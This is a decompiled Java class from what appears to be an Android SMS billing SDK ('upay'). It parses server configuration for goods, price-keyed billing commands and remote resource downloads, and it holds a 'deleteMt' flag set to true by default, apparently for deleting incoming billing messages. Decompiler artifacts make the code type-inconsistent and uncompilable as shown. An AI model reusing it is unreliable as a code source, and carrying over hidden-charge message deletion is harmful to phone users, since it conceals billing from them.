package com.upay.billing.bean;

import android.annotation.SuppressLint;
import com.upay.billing.UpayConstant;
import com.upay.billing.UpayCore;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.io.File;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.regex.Pattern;

@SuppressLint({"UseSparseArrays"})
public class Plan
  implements Serializable
{
  public static final int ALPHA = 2;
  public static final int BETA = 3;
  public static final int CLOSED = 0;
  public static final int DEVELOPING = 1;
  public static final int RELEASED = 4;
  private static final long serialVersionUID = 1L;
  public String appKey;
  public String appSecret;
  public long buildDate;
  public String channelKey;
  public HashMap<Integer, ArrayList<Cmd>> cmds;
  public boolean deleteMt = true;
  public Pattern excludeCmdKeys = null;
  public HashMap<String, Goods> goods;
  public int issueType = 0;
  public long lastUpdate;
  public HashMap<String, Json> localResources;
  public HashMap<String, Json> resources;
  public int state = 4;
  
  public Plan(String paramString)
  {
    this.appKey = paramString;
  }
  
  public String getLocalResourcePath(String paramString)
  {
    paramString = (Json)this.localResources.get(paramString);
    if (paramString != null) {
      return paramString.getStr("path");
    }
    return null;
  }
  
  @SuppressLint({"UseSparseArrays"})
  public void update(UpayCore paramUpayCore, String paramString1, String paramString2, long paramLong, Json paramJson)
  {
    this.appSecret = paramString1;
    this.channelKey = paramString2;
    this.buildDate = paramLong;
    this.lastUpdate = System.currentTimeMillis();
    this.deleteMt = paramJson.getBool("delete_mt", Boolean.valueOf(true)).booleanValue();
    this.issueType = paramJson.getInt("issue_type", Integer.valueOf(0)).intValue();
    this.excludeCmdKeys = Pattern.compile(paramJson.getStr("exclude_cmd_keys", "^$"));
    this.state = paramJson.getInt("app_state", Integer.valueOf(4)).intValue();
    this.goods = new HashMap();
    paramString1 = Util.safeIter(paramJson.getArray("goods")).iterator();
    while (paramString1.hasNext())
    {
      paramString2 = (Json)paramString1.next();
      paramString2 = new Goods(this.appKey, paramString2);
      this.goods.put(paramString2.key, paramString2);
    }
    this.cmds = new HashMap();
    paramString1 = Util.safeIter(paramJson.getArray("cmd")).iterator();
    while (paramString1.hasNext())
    {
      paramString2 = new Cmd(paramUpayCore, (Json)paramString1.next());
      Util.mapListAdd(this.cmds, Integer.valueOf(paramString2.price), paramString2);
    }
    if (this.localResources == null) {
      this.localResources = new HashMap();
    }
    this.resources = new HashMap();
    paramString1 = paramJson.getArray("resource");
    paramUpayCore = new File(UpayConstant.RESOURCE_CACHE_PATH + this.appKey);
    paramUpayCore.mkdirs();
    if (paramString1 != null)
    {
      paramString1 = Util.safeIter(paramString1).iterator();
      while (paramString1.hasNext())
      {
        paramString2 = (Json)paramString1.next();
        paramJson = paramString2.getStr("key");
        this.resources.put(paramJson, paramString2);
        Json localJson = (Json)this.localResources.get(paramJson);
        File localFile = new File(paramUpayCore, paramJson);
        if ((localJson == null) || (!localFile.exists()) || ((localJson != null) && (paramString2.getLong("utime") > localJson.getLong("ctime")))) {
          Util.addTask(new Plan.1(this, paramString2.getStr("url"), localFile, paramJson));
        }
      }
    }
  }
}
